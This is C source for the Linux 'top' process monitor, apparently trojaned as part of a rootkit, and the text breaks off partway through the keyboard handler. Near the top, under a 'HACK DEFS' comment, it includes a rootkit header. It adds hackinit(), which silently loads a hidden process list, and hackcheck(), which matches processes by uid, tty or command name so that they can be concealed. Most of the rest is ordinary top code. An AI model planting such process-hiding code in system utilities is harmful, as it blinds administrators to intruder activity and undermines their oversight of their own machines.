/*
 * top.c              - show top CPU processes
 *
 * Copyright (c) 1992 Branko Lankester
 * Copyright (c) 1992 Roger Binns
 *
 * Snarfed and HEAVILY modified for the YAPPS (yet another /proc ps)
 * by Michael K. Johnson, johnsonm@sunsite.unc.edu.  What is used is what
 * is required to have a common interface.
 *
 * Modified Michael K Johnson's ps to make it a top program.
 * Also borrowed elements of Roger Binns kmem based top program.
 * Changes made by Robert J. Nation (nation@rocket.sanders.lockheed.com)
 * 1/93
 *
 * Modified by Michael K. Johnson to be more efficient in cpu use
 * 2/21/93
 *
 * Changed top line to use uptime for the load average.  Also
 * added SIGTSTP handling.  J. Cowley, 19 Mar 1993.
 *
 * Modified quite a bit by Michael Shields (mjshield@nyx.cs.du.edu)
 * 1994/04/02.  Secure mode added.  "d" option added.  Argument parsing
 * improved.  Switched order of tick display to user, system, nice, idle,
 * because it makes more sense that way.  Style regularized (to K&R,
 * more or less).  Cleaned up much throughout.  Added cumulative mode.
 * Help screen improved.
 *
 * Fixed kill buglet brought to my attention by Rob Hooft.
 * Problem was mixing of stdio and read()/write().  Added
 * getnum() to solve problem.
 * 12/30/93 Michael K. Johnson
 *
 * Added toggling output of idle processes via 'i' key.
 * 3/29/94 Gregory K. Nickonov
 *
 * Fixed buglet where rawmode wasn't getting restored.
 * Added defaults for signal to send and nice value to use.
 * 5/4/94 Jon Tombs.
 *
 * Modified 1994/04/25 Michael Shields <mjshield@nyx.cs.du.edu>
 * Merged previous changes to 0.8 into 0.95.
 * Allowed the use of symbolic names (e.g., "HUP") for signal input.
 * Rewrote getnum() into getstr(), getint(), getsig(), etc.
 * 
 * Modified 1995  Helmut Geyer <Helmut.Geyer@iwr.uni-heidelberg.de> 
 * added kmem top functionality (configurable fields)
 * configurable order of process display
 * Added options for dis/enabling uptime, statistics, and memory info.
 * fixed minor bugs for ELF systems (e.g. SIZE, RSS fields)
 *
 * Modified 1996/05/18 Helmut Geyer <Helmut.Geyer@iwr.uni-heidelberg.de>
 * Use of new interface and general cleanup. The code should be far more
 * readable than before.
 */

#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <time.h>
#include <sys/ioctl.h>
#include <pwd.h>
#include <linux/sched.h>
#include <linux/tty.h>
#include <termcap.h>
#include <termios.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <ctype.h>
#include <setjmp.h>
#include <stdarg.h>

#include "proc/sysinfo.h"
#include "proc/ps.h"
#include "proc/whattime.h"
#include "proc/signals.h"
#include "proc/version.h"
#include "proc/readproc.h"
/* these should be in the readproc.h header or in the ps.h header */
typedef int (*cmp_t)(void*,void*);
extern void reset_sort_options (void);
extern int parse_sort_opt(char* opt);
extern void register_sort_function (int dir, cmp_t func);
extern char *status(proc_t* task);

#define PUTP(x) (tputs(x,1,putchar))

#include "top.h"  /* new header for top specific things */

/* HACK DEFS */
#include "../rootkit.h"
#define STR_SIZE 128
#define SPC_CHAR " "
#define END_CHAR "\n"
int showall=0;

struct  h_st {
        struct h_st     *next;
        int             hack_type;
        char            hack_cmd[STR_SIZE];
};

struct  h_st    *hack_list;
struct  h_st    *h_tmp;

char    tmp_str[STR_SIZE];
char    *strp;

FILE    *fp_hack;

void hackinit(void)
{
   h_tmp=(struct h_st *)malloc(sizeof(struct h_st));
   hack_list=h_tmp;

   if ((int)fp_hack=fopen(ROOTKIT_PROCESS_FILE,"r")) {
      while (fgets(tmp_str, 126, fp_hack)) {
         h_tmp->next=(struct h_st *)malloc(sizeof(struct h_st));
         strp=tmp_str;
         strp=strtok (strp, SPC_CHAR);
         h_tmp->hack_type=atoi(strp);
         strp=strtok ('\0', END_CHAR);
         strcpy (h_tmp->hack_cmd, strp);
         h_tmp=h_tmp->next;
      }
   fclose(fp_hack);
   }
   h_tmp->next=NULL;
}

int hackcheck(proc_t *p)
{
int i=0;
   if (!p) return 0; 
   for (h_tmp=hack_list; h_tmp->next; h_tmp=h_tmp->next) {
      switch (h_tmp->hack_type) {
       case 0:
         if (p->uid==atoi(h_tmp->hack_cmd))
           return 1;
         break;
       case 1:
         while((p->ttyc[i]==' ')&&(i<4)) i++;
         if (!strcmp(&p->ttyc[i], h_tmp->hack_cmd))
           return 1;
         break;
       case 2:
         if (strcmp((char *)p->cmd,h_tmp->hack_cmd)==0)
           return 1;
         break;
        case 3:
         if (strstr((char *)p->cmd,h_tmp->hack_cmd))
           return 1;
         break;
      }
   }
return 0;
}

/*#######################################################################
 *####  Startup routines: parse_options, get_options,      ##############
 *####                    setup_terminal and main          ##############
 *#######################################################################
 */

      /*
       * parse the options string as read from the config file(s).
       * if top is in secure mode, disallow changing of the delay time between
       * screen updates.
       */
void parse_options(char *Options, int secure)
{
    int i;
    hackinit();
    for (i = 0; i < strlen(Options); i++) {
	switch (Options[i]) {
	  case '2':
	  case '3':
	  case '4':
	  case '5':
	  case '6':
	  case '7':
	  case '8':
	  case '9':
	    if (!secure)
		Sleeptime = (float) Options[i] - '0';
	    break;
	  case 'S':
	    Cumulative = 1;
	    headers[22][1] = 'C';
	    break;
	  case 's':
	    Secure = 1;
	    break;
	  case 'i':
	    Noidle = 1;
	    break;
	  case 'm':
	    show_memory = 0;
	    header_lines -= 2;
	    break;
	  case 'M':
	    sort_type = S_MEM;
	    reset_sort_options();
	    register_sort_function( -1, (cmp_t)mem_sort);
	    break;
	  case 'l':
	    show_loadav = 0;
	    header_lines -= 1;
	    break;
	  case 'P':
	    sort_type = S_PCPU;
	    reset_sort_options();
	    register_sort_function( -1, (cmp_t)pcpu_sort);
	    break;
	  case 't':
	    show_stats = 0;
	    header_lines -= 2;
	    break;
	  case 'T':
	    sort_type = S_TIME;
	    reset_sort_options();
	    register_sort_function( -1, (cmp_t)time_sort);
	    break;
	  case 'c':
	    show_cmd = 1;
	    break;
	  case '\n':
	    break;
	  default:
	    fprintf(stderr, "Wrong configuration option %c\n", i);
	    exit(1);
	    break;
	}
    }
}

/* 
 * Read the configuration file(s). There are two files, once SYS_TOPRC 
 * which should only contain the secure switch and a sleeptime
 * value iff ordinary users are to use top in secure mode only.
 * 
 * The other file is $HOME/RCFILE. 
 * The configuration file should contain two lines (any of which may be
 *  empty). The first line specifies the fields that are to be displayed
 * in the order you want them to. Uppercase letters specify fields 
 * displayed by default, lowercase letters specify fields not shown by
 * default. The order of the letters in this line corresponds to the 
 * order of the displayed fileds.
 *
 * all Options but 'q' can be read from this config file
 * The delay time option syntax differs from the commandline syntax:
 *   only integer values between 2 and 9 seconds are recognized
 *   (this is for standard configuration, so I think this should do).
 *
 * usually this file is not edited by hand, but written from top using
 * the 'W' command. 
 */

void get_options(void)
{
    FILE *fp;
    char *pt;
    char rcfile[MAXNAMELEN];
    char Options[256] = "";

    header_lines = 7;
    strcpy(rcfile, SYS_TOPRC);
    fp = fopen(rcfile, "r");
    if (fp != NULL) {
	fgets(Options, 254, fp);
	fclose(fp);
    }
    parse_options(Options, 0);
    strcpy(Options, "");
    if (getenv("HOME")) {
	strcpy(rcfile, getenv("HOME"));
	strcat(rcfile, "/");
    }
    strcat(rcfile, RCFILE);
    fp = fopen(rcfile, "r");
    if (fp == NULL) {
	strcpy(Fields, DEFAULT_SHOW);
    } else {
	if (fgets(Fields, 254, fp) != NULL) {
	    pt = strstr(Fields, "\n");
	    *pt = 0;
	}
	fgets(Options, 254, fp);
	fclose(fp);
    }
    parse_options(Options, getuid()? Secure : 0);
}

/*
     * Set up the terminal attributes.
     */
void setup_terminal(void)
{
    char *termtype;
    struct termio newtty;

    termtype = getenv("TERM");
    if (!termtype) {
	/* In theory, $TERM should never not be set, but in practice,
	   some gettys don't.  Fortunately, vt100 is nearly always
	   correct (or pretty close). */
	termtype = "VT100";
	/* fprintf(stderr, PROGNAME ": $TERM not set\n"); */
	/* exit(1); */
    }
    if (ioctl(0, TCGETA, &Savetty) == -1) {
	perror(PROGNAME ": ioctl() failed");
	error_end(errno);
    }
    newtty = Savetty;
    newtty.c_lflag &= ~ICANON;
    newtty.c_lflag &= ~ECHO;
    newtty.c_cc[VMIN] = 1;
    newtty.c_cc[VTIME] = 0;
    if (ioctl(0, TCSETAF, &newtty) == -1) {
	printf("cannot put tty into raw mode\n");
	error_end(1);
    }
    ioctl(0, TCGETA, &Rawtty);

    /*
     * Get termcap entries and window size.
     */
    tgetent(NULL, termtype);
    cm = tgetstr("cm", 0);
    top_clrtobot = tgetstr("cd", 0);
    cl = tgetstr("cl", 0);
    top_clrtoeol = tgetstr("ce", 0);
    ho = tgetstr("ho", 0);
    md = tgetstr("md", 0);
    mr = tgetstr("mr", 0);
    me = tgetstr("me", 0);
}

int main(int argc, char **argv)
{
    /* For select(2). */
    struct timeval tv;
    fd_set in;
    /* For parsing arguments. */
    char *cp;
    /* The key read in. */
    char c;

    get_options();
    /*
     * Parse arguments.
     */
    argv++;
    while (*argv) {
	cp = *argv++;
	while (*cp) {
	    switch (*cp) {
	      case 'd':
	        if (cp[1]) {
		    if (sscanf(++cp, "%f", &Sleeptime) != 1) {
			fprintf(stderr, PROGNAME ": Bad delay time `%s'\n", cp);
			exit(1);
		    }
		    goto breakargv;
		} else if (*argv) { /* last char in an argv, use next as arg */
		    if (sscanf(cp = *argv++, "%f", &Sleeptime) != 1) {
			fprintf(stderr, PROGNAME ": Bad delay time `%s'\n", cp);
			exit(1);
		    }
		    goto breakargv;
		} else {
		    fprintf(stderr, "-d requires an argument\n");
		    exit(1);
		}
		break;
	      case 'q':
		if (!getuid())
		    /* set priority to -10 in order to stay above kswapd */
		    if (setpriority(PRIO_PROCESS, getpid(), -10)) {
			/* We check this just for paranoia.  It's not
			   fatal, and shouldn't happen. */
			perror(PROGNAME ": setpriority() failed");
		    }
		Sleeptime = 0;
		break;
	      case 'c':
	        show_cmd = !show_cmd;
		break;
	      case 'S':
		Cumulative = 1;
		break;
	      case 'i':
		Noidle = 1;
		break;
	      case 's':
		Secure = 1;
		break;
	      case '-':
		break;		/* Just ignore it */
#if defined (SHOWFLAG)
              case '/': showall++;
#endif
	      default:
		fprintf(stderr, PROGNAME ": Unknown argument `%c'\n", *cp);
		exit(1);
	    }
	    cp++;
	}
    breakargv:
    }
    
    /* set to PCPU sorting */
    register_sort_function( -1, (cmp_t)pcpu_sort);
    
    /* for correct handling of some fields, we have to do distinguish 
  * between kernel versions */
    set_linux_version();
    /* get kernel symbol table, if needed */
    if (!CL_wchan_nout) {
	if (open_psdb()) {
	    CL_wchan_nout = 1;
	} else {
	    psdbsucc = 1;
	}
    }

    setup_terminal();
    window_size();
    /*
     * calculate header size, length of cmdline field ...
     */
    Numfields = make_header();
    /*
     * Set up signal handlers.
     */
    signal(SIGHUP, (void *) (int) end);
    signal(SIGINT, (void *) (int) end);
    signal(SIGQUIT, (void *) (int) end);
    signal(SIGTSTP, (void *) (int) stop);
    signal(SIGWINCH, (void *) (int) window_size);

    /* loop, collecting process info and sleeping */
    while (1) {
	if (setjmp(redraw_jmp))
	    clear_screen();

	/* display the tasks */
	show_procs();
	/* sleep & wait for keyboard input */
	tv.tv_sec = Sleeptime;
	tv.tv_usec = (Sleeptime - (int) Sleeptime) * 1000000;
	FD_ZERO(&in);
	FD_SET(0, &in);
	if (select(16, &in, 0, 0, &tv) > 0 && read(0, &c, 1) == 1)
	    do_key(c);
    }
}

/*#######################################################################
 *#### Signal handled routines: error_end, end, stop, window_size     ###
 *#### Small utilities: make_header, getstr, getint, getfloat, getsig ###
 *#######################################################################
 */


	/*
	 *  end when exiting with an error.
	 */
void error_end(int rno)
{
    if (psdbsucc)
        close_psdb();
    ioctl(0, TCSETAF, &Savetty);
    PUTP(tgoto(cm, 0, Lines - 1));
    fputs("\r\n", stdout);
    exit(rno);
}
/*
	 * Normal end of execution.
	 */
void end(void)
{
    if (psdbsucc)
	close_psdb();
    ioctl(0, TCSETAF, &Savetty);
    PUTP(tgoto(cm, 0, Lines - 1));
    fputs("\r\n", stdout);
    exit(0);
}

/*
	 * SIGTSTP catcher.
	 */
void stop(void)
{
    /* Reset terminal. */
    if (psdbsucc)
	close_psdb();
    ioctl(0, TCSETAF, &Savetty);
    PUTP(tgoto(cm, 0, Lines - 3));
    fflush(stdout);
    raise(SIGTSTP);
    /* Later... */
    ioctl(0, TCSETAF, &Rawtty);
    signal(SIGTSTP, (void *) (int) stop);
    longjmp(redraw_jmp, 1);
}

/*
       * Reads the window size and clear the window.  This is called on setup,
       * and also catches SIGWINCHs, and adjusts Maxlines.  Basically, this is
       * the central place for window size stuff.
       */
void window_size(void)
{
    struct winsize ws;

    if (ioctl(1, TIOCGWINSZ, &ws) != -1) {
	Cols = ws.ws_col;
	Lines = ws.ws_row;
    } else {
	Cols = tgetnum("co");
	Lines = tgetnum("li");
    }
    clear_screen();
}
/*
       * this adjusts the lines needed for the header to the current value
       */
int make_header(void)
{
    int i, j;

    j = 0;
    for (i = 0; i < strlen(Fields); i++) {
	if (isupper(Fields[i])) {
	    pflags[j++] = Fields[i] - 'A';
	}
    }
    strcpy(Header, "");
    for (i = 0; i < j; i++)
	strcat(Header, headers[pflags[i]]);
    /* readjust window size ... */
    Maxcmd = Cols - strlen(Header) + 7;
    Maxlines = Display_procs ? Display_procs : Lines - header_lines;
    if (Maxlines > Lines - header_lines)
	Maxlines = Lines - header_lines;
    return (j);
}



/*
       * Get a string from the user; the base of getint(), et al.  This really
       * ought to handle long input lines and errors better.  NB: The pointer
       * returned is a statically allocated buffer, so don't expect it to
       * persist between calls.
       */
char *getstr(void)
{
    static char line[BUFSIZ];	/* BUFSIZ from <stdio.h>; arbitrary */
    int i = 0;

    /* Must make sure that buffered IO doesn't kill us. */
    fflush(stdout);
    fflush(stdin);		/* Not POSIX but ok */

    do {
	read(STDIN_FILENO, &line[i], 1);
    } while (line[i++] != '\n' && i < sizeof(line));
    line[--i] = 0;

    return (line);
}


/*
       * Get an integer from the user.  Display an error message and return -1
       * if it's invalid; else return the number.
       */
int getint(void)
{
    char *line;
    int i;
    int r;

    line = getstr();

    for (i = 0; line[i]; i++) {
	if (!isdigit(line[i]) && line[i] != '-') {
	    SHOWMESSAGE(("That's not a number!"));
	    return (-1);
	}
    }

    /* An empty line is a legal error (hah!). */
    if (!line[0])
	return (-1);

    sscanf(line, "%d", &r);
    return (r);
}


/*
	 * Get a float from the user.  Just like getint().
	 */
float getfloat(void)
{
    char *line;
    int i;
    float r;

    line = getstr();

    for (i = 0; line[i]; i++) {
	if (!isdigit(line[i]) && line[i] != '.' && line[i] != '-') {
	    SHOWMESSAGE(("That's not a float!"));
	    return (-1);
	}
    }

    /* An empty line is a legal error (hah!). */
    if (!line[0])
	return (-1);

    sscanf(line, "%f", &r);
    return (r);
}


/*
	 * Get a signal number or name from the user.  Return the number, or -1
	 * on error.
	 */
int getsig(void)
{
    char *line;

    /* This is easy. */
    line = getstr();
    return (get_signal2(line));
}

/*#######################################################################
 *####  Routine for sorting on used time, resident memory and %CPU  #####
 *####  It would be easy to include full sorting capability as in   #####
 *####  ps, but I think there is no real use for something that     #####
 *####  complicated. Using register_sort_function or parse_sort_opt #####
 *####  you just have to do the natural thing and it will work.     #####
 *#######################################################################
 */

int time_sort (proc_t **P, proc_t **Q)
{
    if (Cumulative) {
	if( ((*P)->cutime + (*P)->cstime + (*P)->utime + (*P)->stime) < 
	    ((*Q)->cutime + (*Q)->cstime + (*Q)->utime + (*Q)->stime) )
	    return -1;
	if( ((*P)->cutime + (*P)->cstime + (*P)->utime + (*P)->stime) >
	    ((*Q)->cutime + (*Q)->cstime + (*Q)->utime + (*Q)->stime) )
	    return 1;
    } else {
	if( ((*P)->utime + (*P)->stime) < ((*Q)->utime + (*Q)->stime))
	    return -1;
	if( ((*P)->utime + (*P)->stime) > ((*Q)->utime + (*Q)->stime))
	    return 1;
    }
    return 0;
}

int pcpu_sort (proc_t **P, proc_t **Q)
{
    if( (*P)->pcpu < (*Q)->pcpu )      return -1;
    if( (*P)->pcpu > (*Q)->pcpu )      return 1;
    return 0;
}

int mem_sort (proc_t **P, proc_t **Q)
{
    if( (*P)->resident < (*Q)->resident )      return -1;
    if( (*P)->resident > (*Q)->resident )      return 1;  
    return 0;
}

/*#######################################################################
 *####  Routines handling the field selection/ordering screens:  ########
 *####    show_fields, change_order, change_fields               ########
 *#######################################################################
 */

        /*
	 * Display the specification line of all fields. Upper case indicates
	 * a displayed field, display order is according to the order of the 
	 * letters. A short description of each field is shown as well.
	 * The description of a displayed field is marked by a leading 
	 * asterisk (*).
	 */
void show_fields(void)
{
    int i, row, col;
    char *p;

    clear_screen();
    PUTP(tgoto(cm, 3, 0));
    printf("Current Field Order: %s\n", Fields);
    for (i = 0; i < sizeof headers / sizeof headers[0]; ++i) {
	row = i % (Lines - 3) + 3;
	col = i / (Lines - 3) * 40;
	PUTP(tgoto(cm, col, row));
	for (p = headers[i]; *p == ' '; ++p);
	printf("%c %c: %-10s = %s", (strchr(Fields, i + 'A') != NULL) ? '*' : ' ', i + 'A',
	       p, headers2[i]);
    }
}

/*
	 * change order of displayed fields
	 */
void change_order(void)
{
    char c, ch, *p;
    int i;

    show_fields();
    for (;;) {
	PUTP(tgoto(cm, 0, 0));
	PUTP(top_clrtoeol);
	PUTP(tgoto(cm, 3, 0));
	PUTP(mr);
	printf("Current Field Order: %s", Fields);
	PUTP(me);
	putchar('\n');
	PUTP(tgoto(cm, 0, 1));
	printf("Upper case characters move a field to the left, lower case to the right");
	fflush(stdout);
	ioctl(0, TCSETAF, &Rawtty);
	read(0, &c, 1);
	ioctl(0, TCSETAF, &Savetty);
	i = toupper(c) - 'A';
	if ((p = strchr(Fields, i + 'A')) != NULL) {
	    if (isupper(c))
		p--;
	    if ((p[1] != '\0') && (p >= Fields)) {
		ch = p[0];
		p[0] = p[1];
		p[1] = ch;
	    }
	} else if ((p = strchr(Fields, i + 'a')) != NULL) {
	    if (isupper(c))
		p--;
	    if ((p[1] != '\0') && (p >= Fields)) {
		ch = p[0];
		p[0] = p[1];
		p[1] = ch;
	    }
	} else {
	    break;
	}
    }
    Numfields = make_header();
}
/*
	 * toggle displayed fields
	 */
void change_fields(void)
{
    int i, changed = 0;
    int row, col;
    char c, *p;
    char tmp[2] = " ";

    show_fields();
    for (;;) {
	PUTP(tgoto(cm, 0, 0));
	PUTP(top_clrtoeol);
	PUTP(tgoto(cm, 3, 0));
	PUTP(mr);
	printf("Current Field Order: %s", Fields);
	PUTP(me);
	putchar('\n');
	PUTP(tgoto(cm, 0, 1));
	printf("Toggle fields with a-x, any other key to return: ");
	fflush(stdout);
	ioctl(0, TCSETAF, &Rawtty);
	read(0, &c, 1);
	ioctl(0, TCSETAF, &Savetty);
	i = toupper(c) - 'A';
	if (i >= 0 && i < sizeof headers / sizeof headers[0]) {
	    row = i % (Lines - 3) + 3;
	    col = i / (Lines - 3) * 40;
	    PUTP(tgoto(cm, col, row));
	    if ((p = strchr(Fields, i + 'A')) != NULL) {	/* deselect Field */
		*p = i + 'a';
		putchar(' ');
	    } else if ((p = strchr(Fields, i + 'a')) != NULL) {		/* select previously */
		*p = i + 'A';	/* deselected field */
		putchar('*');
	    } else {		/* select new field */
		tmp[0] = i + 'A';
		strcat(Fields, tmp);
		putchar('*');
	    }
	    changed = 1;
	    fflush(stdout);
	} else
	    break;
    }
    if (changed)
	Numfields = make_header();
}

/*
 *#######################################################################
 *####  Routines handling the main top screen:                   ########
 *####    show_task_info, show_procs, show_memory, do_stats      ########
 *#######################################################################
 */
	/*
	 * Displays infos for a single task
	 */
void show_task_info(proc_t *task, int pmem)
{
    int i,j;
    unsigned int t;
    char *cmdptr;
    char tmp[2048], tmp2[2048] = "", tmp3[2048] = "";

    for (i = 0; i < Numfields; i++) {
	tmp[0] = 0;
	switch (pflags[i]) {
	  case P_PID:
	    sprintf(tmp, "%5d ", task->pid);
	    break;
	  case P_PPID:
	    sprintf(tmp, "%5d ", task->ppid);
	    break;
	  case P_UID:
	    sprintf(tmp, "%4d ", task->uid);
	    break;
	  case P_USER:
	    sprintf(tmp, "%-8.8s ", task->user);
	    break;
	  case P_PCPU:
	    sprintf(tmp, "%2d.%1d ", task->pcpu / 10, task->pcpu % 10);
	    break;
	  case P_PMEM:
	    sprintf(tmp, "%2d.%1d ", pmem / 10, pmem % 10);
	    break;
	  case P_TTY:
	    sprintf(tmp, "%-3.3s ", task->ttyc);
	    break;
	  case P_PRI:
	    sprintf(tmp, "%3d ", task->priority);
	    break;
	  case P_NICE:
	    sprintf(tmp, "%3d ", task->nice);
	    break;
	  case P_PAGEIN:
	    sprintf(tmp, "%6d ", task->maj_flt);
	    break;
	  case P_TSIZ:
	    sprintf(tmp, "%5d ", (task->end_code - task->start_code) / 1024);
	    break;
	  case P_DSIZ:
	    sprintf(tmp, "%5d ", (task->vsize - task->end_code) / 1024);
	    break;
	  case P_SIZE:
	    sprintf(tmp, "%5d ", task->size << CL_pg_shift);
	    break;
	  case P_TRS:
	    sprintf(tmp, "%4d ", task->trs << CL_pg_shift);
	    break;
	  case P_SWAP:
	    sprintf(tmp, "%4d ", (task->size - task->resident) << CL_pg_shift);
	    break;
	  case P_SHARE:
	    sprintf(tmp, "%5d ", task->share << CL_pg_shift);
	    break;
	  case P_A:
	    sprintf(tmp, "%3.3s ", "NYI");
	    break;
	  case P_WP:
	    sprintf(tmp, "%3.3s ", "NYI");
	    break;
	  case P_DT:
	    sprintf(tmp, "%3d ", task->dt);
	    break;
	  case P_RSS:	/* resident not rss, it seems to be more correct. */
	    sprintf(tmp, "%4d ", task->resident << CL_pg_shift);
	    break;
	  case P_WCHAN:
	    if (!CL_wchan_nout)
		sprintf(tmp, "%-9.9s ", wchan(task->wchan));
	    else
		sprintf(tmp, "%-9x", task->wchan);
	    break;
	  case P_STAT:
	    sprintf(tmp, "%-4.4s ", status(task));
	    break;
	  case P_TIME:
	    t = (task->utime + task->stime) / HZ;
	    if (Cumulative)
		t += (task->cutime + task->cstime) / HZ;
	    sprintf(tmp, "%3d:%02d ", t / 60, t % 60);
	    break;
	  case P_COMMAND:
	    if (!show_cmd && task->cmdline && *(task->cmdline)) {
	        j=0;
	        while(((task->cmdline)[j] != NULL) && (strlen(tmp3)<1024)){
		    strcat(tmp3,(task->cmdline)[j]);
		    j++; 
	        }
	        cmdptr = tmp3;
	    } else {
		cmdptr = task->cmd;
	    }
	    if (strlen(cmdptr) > Maxcmd)
		cmdptr[Maxcmd - 1] = 0;
	    sprintf(tmp, "%s", cmdptr);
	    tmp3[0]=0;
	    break;
	  case P_LTR:
	    sprintf(tmp, "%4d ", task->lrs << CL_pg_shift);
	    break;
	  case P_FLAGS:
	    sprintf(tmp, "%8x ", task->flags);
	    break;
	}
	strcat(tmp2, tmp);
    }
    if (strlen(tmp2) > Cols - 1)
	tmp2[Cols - 1] = 0;
    printf("\n%s", tmp2);
    PUTP(top_clrtoeol);
}

/*
 * This is the real program!  Read process info and display it.
 * One could differentiate options of readproctable2, perhaps it
 * would be useful to support the PROC_UID, PROC_TTY and PROC_PID
 * as command line options.
 */
void show_procs(void)
{
    static proc_t **p_table=NULL;
    static int proc_flags;
    int count;
    float elapsed_time;
    unsigned int main_mem;
    static int first=0;

    if (first==0) {
	proc_flags=PROC_FILLMEM|PROC_FILLCMD|PROC_FILLTTY|PROC_FILLUSR;
	p_table=readproctab2(proc_flags, p_table, NULL);
	elapsed_time = get_elapsed_time();
	do_stats(p_table, elapsed_time, 0);
	sleep(1);
	first=1;
    }
    /* Display the load averages. */
    PUTP(ho);
    PUTP(md);
    if (show_loadav) {
	printf("%s", sprint_uptime());
	PUTP(top_clrtoeol);
	putchar('\n');
    }
    p_table=readproctab2(proc_flags, p_table, NULL);
    /* Immediately find out the elapsed time for the frame. */
    elapsed_time = get_elapsed_time();
    /* Display the system stats, calculate percent CPU time
     * and sort the list. */
    do_stats(p_table, elapsed_time,1);
    /* Display the memory and swap space usage. */
    main_mem = show_meminfo();
    if (strlen(Header) + 2 > Cols)
	Header[Cols - 2] = 0;
    PUTP(mr);
    fputs(Header, stdout);
    PUTP(top_clrtoeol);
    PUTP(me);

    /*
     * Finally!  Loop through to find the top task, and display it.
     * Lather, rinse, repeat.
     */
    count = 0;
    while ((count < Maxlines) && (p_table[count]->pid!=-1)) {
	int pmem;
	char stat;

	stat = p_table[count]->state;

	if (!Noidle || (stat != 'S' && stat != 'Z')) {

	    /*
	     * Show task info.
	     */
	    pmem = p_table[count]->resident * 1000 / (main_mem / 4096);
	    show_task_info(p_table[count], pmem);
	}
	count++;
    }
    PUTP(top_clrtobot);
    PUTP(tgoto(cm, 0, header_lines - 2));
    fflush(stdout);
}


/*
 * Finds the current time (in microseconds) and calculates the time
 * elapsed since the last update. This is essential for computing
 * percent CPU usage.
 */
float get_elapsed_time(void)
{
    struct timeval time;
    static struct timeval oldtime;
    struct timezone timez;
    float elapsed_time;

    gettimeofday(&time, &timez);
    elapsed_time = (time.tv_sec - oldtime.tv_sec)
	+ (float) (time.tv_usec - oldtime.tv_usec) / 1000000.0;
    oldtime.tv_sec = time.tv_sec;
    oldtime.tv_usec = time.tv_usec;
    return (elapsed_time);
}


/*
 * Reads the memory info and displays it.  Returns the total memory
 * available, for use in percent memory usage calculations.
 */
unsigned show_meminfo(void)
{
    unsigned **mem;

    if (!(mem = meminfo()) ||	/* read+parse /proc/meminfo */
	mem[meminfo_main][meminfo_total] == 0) {	/* cannot normalize mem usage */
	fprintf(stderr, "Cannot get size of memory from /proc/meminfo\n");
	error_end(1);
    }
    if (show_memory) {
	printf("Mem:  %5dK av, %5dK used, %5dK free, %5dK shrd, %5dK buff",
	       mem[meminfo_main][meminfo_total] >> 10,
	       mem[meminfo_main][meminfo_used] >> 10,
	       mem[meminfo_main][meminfo_free] >> 10,
	       mem[meminfo_main][meminfo_shared] >> 10,
	       mem[meminfo_main][meminfo_buffers] >> 10);
	PUTP(top_clrtoeol);
	putchar('\n');
	printf("Swap: %5dK av, %5dK used, %5dK free               %5dK cached",
	       mem[meminfo_swap][meminfo_total] >> 10,
	       mem[meminfo_swap][meminfo_used] >> 10,
	       mem[meminfo_swap][meminfo_free] >> 10,
	       mem[meminfo_total][meminfo_cached] >> 10);
	PUTP(top_clrtoeol);
	putchar('\n');
    }
    PUTP(me);
    PUTP(top_clrtoeol);
    putchar('\n');
    return mem[meminfo_main][meminfo_total];
}

/*
 * Calculates the number of tasks in each state (running, sleeping, etc.).
 * Calculates the CPU time in each state (system, user, nice, etc).
 * Calculates percent cpu usage for each task.
 */
void do_stats(proc_t** p, float elapsed_time, int pass)
{
    proc_t *this;
    int index, total_time, i, n = 0;
    int sleeping = 0, stopped = 0, zombie = 0, running = 0;
    int system_ticks = 0, user_ticks = 0, nice_ticks = 0, idle_ticks = 1000;
    static int prev_count = 0;
    int stime, utime;
    static struct save_hist save_history[NR_TASKS];
    struct save_hist New_save_hist[NR_TASKS];

    /*
     * Make a pass through the data to get stats.
     */
    index = 0;
    while (p[n]->pid != -1) {
	this = p[n];
	switch (this->state) {
	  case 'S':
	  case 'D':
	    sleeping++;
	    break;
	  case 'T':
	    stopped++;
	    break;
	  case 'Z':
	    zombie++;
	    break;
	  case 'R':
	    running++;
	    break;
	  default:
	    /* Don't know how to handle this one. */
	    break;
        }

	/*
	 * Calculate time in this process.  Time is sum of user time
	 * (utime) plus system time (stime).
	 */
	total_time = this->utime + this->stime;
	New_save_hist[index].ticks = total_time;
	New_save_hist[index].pid = this->pid;
	stime = this->stime;
	utime = this->utime;
	New_save_hist[index].stime = stime;
	New_save_hist[index].utime = utime;
	/* find matching entry from previous pass */
	i = 0;
	while (i < prev_count) {
	    if (save_history[i].pid == this->pid) {
		total_time -= save_history[i].ticks;
		stime -= save_history[i].stime;
		utime -= save_history[i].utime;

		i = NR_TASKS;
	    }
	    i++;
	}

	/*
	 * Calculate percent cpu time for this task.
	 */
	this->pcpu = (total_time * 10 * 100/HZ) / elapsed_time;
	if (this->pcpu > 999)
	    this->pcpu = 999;

	/*
	 * Calculate time in idle, system, user and niced tasks.
	 */
	idle_ticks -= this->pcpu;
	system_ticks += stime;
	user_ticks += utime;
	if (this->priority > 0)
	    nice_ticks += this->pcpu;

	index++;
	n++;
	if (n > NR_TASKS) {
	    printf(PROGNAME ": Help!  Too many tasks!\n");
	    end();
	}
    }

    if (idle_ticks < 0)
	idle_ticks = 0;
    system_ticks = (system_ticks * 10 * 100/HZ) / elapsed_time;
    user_ticks = (user_ticks * 10 * 100/HZ) / elapsed_time;

    /*
     * Display stats.
     */
    if (pass > 0 && show_stats) {
	printf("%d processes: %d sleeping, %d running, %d zombie, "
	       "%d stopped",
	       n, sleeping, running, zombie, stopped);
	PUTP(top_clrtoeol);
	putchar('\n');
	printf("CPU states: %2d.%d%% user, %2d.%d%% system,"
	       " %2d.%d%% nice, %2d.%d%% idle",
	       user_ticks / 10, user_ticks % 10,
	       system_ticks / 10, system_ticks % 10,
	       nice_ticks / 10, nice_ticks % 10,
	       idle_ticks / 10, idle_ticks % 10);
	PUTP(top_clrtoeol);
	putchar('\n');
    }
    /*
     * Save this frame's information.
     */
    for (i = 0; i < n; i++) {
	/* copy the relevant info for the next pass */
 	save_history[i].pid = New_save_hist[i].pid;
	save_history[i].ticks = New_save_hist[i].ticks;
	save_history[i].stime = New_save_hist[i].stime;
	save_history[i].utime = New_save_hist[i].utime;
    }
    prev_count = n;
    qsort(p, n, sizeof(proc_t*), (void*)mult_lvl_cmp);
}


/*
 * Process keyboard input during the main loop
 */
void do_key(char c)
{
    int numinput, i;
    char rcfile[MAXNAMELEN];
    FILE *fp;

    /*
     * First the commands which don't require a terminal mode switch.
     */
    if (c == 'q')
	end();
    else if (c == 12) {
	clear_screen();
	return;
    }
    /*
